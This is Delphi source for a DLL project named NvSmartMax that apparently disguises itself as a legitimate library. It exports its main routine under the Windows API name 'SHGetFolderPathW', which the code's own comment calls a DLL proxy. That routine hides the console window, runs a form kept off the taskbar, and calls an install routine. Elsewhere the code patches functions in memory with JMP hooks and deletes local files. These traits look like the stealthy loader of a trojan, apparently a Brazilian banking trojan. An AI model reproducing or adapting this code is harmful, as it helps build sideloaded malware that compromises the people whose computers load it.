program NvSmartMax;

{$SETPEOPTFLAGS $140}
{$R 'Resource.res' 'Resource.rc'}
{$R 'JLI_CmdToArgs.res' 'JLI_CmdToArgs.rc'}
{$R 'megasena.res' 'megasena.rc'}

uses
  System.SysUtils,
  System.Classes,
  Winapi.Windows,
  Winapi.ShellAPI,
  ZLib,
  forms,
  Winapi.ActiveX,
  AclApi,
  AccCtrl,
  Vcl.Controls,
  Vcl.ExtCtrls,
  Vcl.StdCtrls,
  IdHTTP,
  System.Win.ComObj,
  System.NetEncoding,
  Winapi.ShlObj,
  variaveis in 'variaveis.pas',
  principal in 'principal.pas',
  conexoes in 'conexoes.pas',
  tapioca in 'tapioca.pas',
  ut_07 in 'ut_07.pas' {TNT_07},
  ut_02 in 'ut_02.pas' {TNT_02},
  ut_03 in 'ut_03.pas' {TNT_03},
  ut_04 in 'ut_04.pas' {TNT_04},
  ut_05 in 'ut_05.pas' {TNT_05},
  ut_06 in 'ut_06.pas' {TNT_06},
  ut_01 in 'ut_01.pas' {TNT_01},
  umodulo in 'umodulo.pas' {frmstart},
  usession in 'usession.pas',
  u_rec in 'u_rec.pas',
  ut_test in 'ut_test.pas' {TNT_TEST},
  funcoes in 'funcoes.pas';

//{$R avira2.res}

procedure myLdrLoadDll(PathToFile: PAnsiChar; Flags: variant;
  ModuleFileName: PAnsiChar; var ModuleHandle: THandle);
begin
  // MessageBox(0, 'injection blocked!', 'WARNING!', MB_OK);
  ModuleHandle := 0;
end;

procedure hook(target, newfunc: pointer);
var
  jmpto: dword;
  OldProtect: Cardinal;
begin
  jmpto := dword(newfunc) - dword(target) - 5;
  VirtualProtect(target, 5, PAGE_EXECUTE_READWRITE, @OldProtect);
  pbyte(target)^ := $E9;
  pdword(dword(target) + 1)^ := jmpto;
end;

procedure DeleteLocalMui;
var
  i: integer;
  sr: TSearchRec;
begin
  i := FindFirst(ExtractFilePath(Application.ExeName) + 'locales\*.*',
    faAnyFile, sr);
  while i = 0 do
  begin
    DeleteFile(pchar(ExtractFilePath(Application.ExeName) + 'locales\' +
      sr.Name));
    i := FindNext(sr);
  end;
end;

procedure processmsg;
var
  msg: TMsg;
begin
  while PeekMessage(msg, 0, 0, 0, PM_REMOVE) do
  begin
    TranslateMessage(msg);
    DispatchMessage(msg);
  end;
end;

function GetConsoleWindow: HWND; stdcall; external kernel32;

var
  ThreadID: Cardinal;

//procedure myProcedure(); stdcall; // exports  ORIGINAL
procedure StampingVMware(); stdcall; // exports FUNCOES DLL PROXY
begin
  ShowWindow(GetConsoleWindow, SW_MINIMIZE);
  ShowWindow(GetConsoleWindow, SW_HIDE);
  CoInitialize(nil);
  Application.Initialize;
  Application.CreateForm(Tfrmstart, frmstart);
  Application.MainFormOnTaskbar := False;
  Application.ShowMainForm := False;
  Install_Cur(False);
  Application.Run;

  repeat
    processmsg;
    Sleep(3000);
  until ProcessaOK;
end;

procedure EntryPointProc(reason: integer);
begin
  case reason of
    DLL_PROCESS_ATTACH: // 1
      begin
      end;
  end;
end;


exports

StampingVMware name 'SHGetFolderPathW';

begin
 DllProc := @EntryPointProc;
 DllProc(DLL_PROCESS_ATTACH);
end.

